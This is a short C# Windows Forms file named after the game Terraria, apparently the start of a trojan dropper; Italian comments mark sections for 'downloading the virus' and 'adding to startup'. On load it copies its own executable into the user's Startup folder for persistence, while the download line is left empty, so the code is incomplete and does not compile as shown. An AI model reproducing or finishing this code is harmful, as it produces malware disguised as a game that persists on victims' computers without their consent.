using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Terraria
{
    public partial class Terraria : Form
    {
        public Terraria()
        {
            InitializeComponent();
        }
        private void Terraria_Load(object sender, EventArgs e)
        {
            //NOME DEL FILE
            //
            string file = System.AppDomain.CurrentDomain.FriendlyName;
            file = file.Replace(".vshost", "");
            info.Text = file;
            //
            //

            //DOWNLOAD DEL VIRUS
            //
            //
            string download =;
            //
            //AGGIUNTA ALLO STARTUP
            //
            try
            {
                System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + download);
            }
            catch
            {
                this.Close();
            }
            //
            //



        }
    }
}
